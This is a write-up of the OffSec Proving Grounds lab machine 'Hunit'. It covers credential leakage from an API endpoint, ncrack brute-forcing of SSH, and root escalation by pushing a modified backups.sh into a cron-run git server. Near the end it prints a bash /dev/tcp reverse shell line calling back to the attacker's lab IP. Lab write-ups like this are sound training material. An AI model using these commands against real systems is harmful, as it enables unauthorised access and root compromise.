---
title: "Proving grounds Practice: Hunit"
layout: post
date: 2024-02-25 02:00
tag: 
- CTF
- Offsec labs
- OSCP
- Writeup
- Linux
- PG-Practice
- Git server
writeups: true
hidden: true
author: Naveen
description: "Offsec proving grounds practice linux machine writeup"
---

# NMAP

```text
PORT      STATE SERVICE     VERSION
8080/tcp  open  http-proxy
12445/tcp open  netbios-ssn Samba smbd 4.6.2
18030/tcp open  http        Apache httpd 2.4.46 ((Unix))
43022/tcp open  ssh         OpenSSH 8.4 (protocol 2.0)
```

## 8080/tcp  open  http-proxy

File Discovery
None

## Directory Discovery
- http://192.168.213.125:8080/api/
- http://192.168.213.125:8080/api/user/

**User directory discloses some credentials.**

```json
[
  {
    "login": "rjackson",
    "password": "yYJcgYqszv4aGQ",
    "firstname": "Richard",
    "lastname": "Jackson",
    "description": "Editor",
    "id": 1
  },
  {
    "login": "jsanchez",
    "password": "d52cQ1BzyNQycg",
    "firstname": "Jennifer",
    "lastname": "Sanchez",
    "description": "Editor",
    "id": 3
  },
  {
    "login": "dademola",
    "password": "ExplainSlowQuest110",
    "firstname": "Derik",
    "lastname": "Ademola",
    "description": "Admin",
    "id": 6
  },
  {
    "login": "jwinters",
    "password": "KTuGcSW6Zxwd0Q",
    "firstname": "Julie",
    "lastname": "Winters",
    "description": "Editor",
    "id": 7
  },
  {
    "login": "jvargas",
    "password": "OuQ96hcgiM5o9w",
    "firstname": "James",
    "lastname": "Vargas",
    "description": "Editor",
    "id": 10
  }
]
```

### Users
rjackson
jsanchez
dademola
jwinters
jvargas

### Passwords
yYJcgYqszv4aGQ
d52cQ1BzyNQycg
ExplainSlowQuest110
KTuGcSW6Zxwd0Q
OuQ96hcgiM5o9w

## Brute force credentials for SSH

```sh
naveenj@hackerspace:|22:22|~/proving_grounds/Hunit/files$ ncrack -vvv ssh://192.168.213.125:43022 -U users -P passwords 

Starting Ncrack 0.7 ( http://ncrack.org ) at 2023-10-23 22:22 EDT

Discovered credentials on ssh://192.168.213.125:43022 'dademola' 'ExplainSlowQuest110'
ssh://192.168.213.125:43022 finished.

Discovered credentials for ssh on 192.168.213.125 43022/tcp:
192.168.213.125 43022/tcp ssh: 'dademola' 'ExplainSlowQuest110'
```

## 12445/tcp open  netbios-ssn Samba smbd 4.6.2

```sh
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
	Commander       Disk      Dademola Files
	IPC$            IPC       IPC Service (Samba 4.13.2)
Reconnecting with SMB1 for workgroup listing.
```

## 43022/tcp open  ssh   OpenSSH 8.4 (protocol 2.0)

SSH to user using dademola:ExplainSlowQuest110

```sh
naveenj@hackerspace:|22:25|~/proving_grounds/Hunit$ ssh -p 43022 dademola@192.168.213.125
dademola@192.168.213.125's password:ExplainSlowQuest110
Last login: Tue Oct 24 02:22:47 2023 from 192.168.45.196
[dademola@hunit ~]$ 
```

## Privilege Escalation

Download linpeas using port 8080 and note that a cron job is running.

`root         300  0.0  0.0   3644  2220 ?        Ss   02:19   0:00 /usr/bin/crond -n`

```sh
/var/spool/anacron:
total 20
drwxr-xr-x 2 root root 4096 Nov  6  2020 .
drwxr-xr-x 6 root root 4096 Nov  6  2020 ..
-rw------- 1 root root    9 Feb 16  2023 cron.daily
-rw------- 1 root root    9 Feb 16  2023 cron.monthly
-rw------- 1 root root    9 Feb 16  2023 cron.weekly
*/3 * * * * /root/git-server/backups.sh
*/2 * * * * /root/pull.sh
```

## Cron job

- Found id_rsa and id_rsa.pub keys for root.

## Extended capabilities

```sh
[dademola@hunit ~]$ getcap -r / 2> /dev/null
/usr/bin/newgidmap cap_setgid=ep
/usr/bin/newuidmap cap_setuid=ep
```

## Exploring cron

```sh
[dademola@hunit etc]$ cat crontab.bak 
*/3 * * * * /root/git-server/backups.sh
*/2 * * * * /root/pull.sh
```

- Cron running these 2 scripts every 3 and 2 minutes.
- Clone the /git-server folder to the /tmp folder for inspection
- git clone file:///git-server

```sh
[dademola@hunit git-server]$ cat backups.sh 
#!/bin/bash
#
#
# # Placeholder
#
[dademola@hunit git-server]$ ls -al
total 8
drwxr-xr-x 3 dademola dademola 120 Oct 24 03:04 .
drwxrwxrwt 5 root     root     120 Oct 24 03:04 ..
drwxr-xr-x 8 dademola dademola 260 Oct 24 03:04 .git
-rw-r--r-- 1 dademola dademola   0 Oct 24 03:04 NEW_CHANGE
-rw-r--r-- 1 dademola dademola  63 Oct 24 03:04 README
-rw-r--r-- 1 dademola dademola  34 Oct 24 03:04 backups.sh
```

The backups.sh file is a placeholder file.

To gain control over the script, we need to set up our git identity by configuring the user.name and user.email using the commands git config — global user.name “dademola” and git config — global user.email “dademola@hunit.(none)”, respectively.

```sh
[dademola@hunit git-server]$ git config --global user.name "dademola"
[dademola@hunit git-server]$ git config --global user.email "dademola@hunit.(none)"
```

Clone remote git server using git SSH key

```sh
naveenj@hackerspace:|23:18|~/proving_grounds/Hunit$ GIT_SSH_COMMAND='ssh -i id_rsa -p 43022' git clone git@192.168.213.125:/git-server
```

Add reverse shell connection code to the backups.sh file. Configure git in local machine to push the updated code.

```sh
naveenj@hackerspace:|23:23|~/proving_grounds/Hunit/git-server$ git config --global user.name "naveenj"
naveenj@hackerspace:|23:23|~/proving_grounds/Hunit/git-server$ git config --global user.email "naveenj@kali.(none)"
naveenj@hackerspace:|23:24|~/proving_grounds/Hunit/git-server$ git add -A
naveenj@hackerspace:|23:24|~/proving_grounds/Hunit/git-server$ git commit -m "exp"
#git push
naveenj@hackerspace:|23:25|~/proving_grounds/Hunit/git-server$ GIT_SSH_COMMAND='ssh -i ../id_rsa -p 43022' git push origin master
Enumerating objects: 5, done.
Counting objects: 100% (5/5), done.
Delta compression using up to 4 threads
Compressing objects: 100% (3/3), done.
Writing objects: 100% (3/3), 326 bytes | 326.00 KiB/s, done.
Total 3 (delta 1), reused 0 (delta 0), pack-reused 0
To 192.168.213.125:/git-server
   b50f4e5..eee611b  master -> master
```

Ensure the shell is in the /git-server folder.

Reverse shell
```sh
sh -i >& /dev/tcp/192.168.45.196/8080 0>&1
```

Once the cron job running the reverse shell with root privilege will be obtained.

For more insights and updates, follow me on Twitter: [@thevillagehacker](https://twitter.com/thevillagehackr).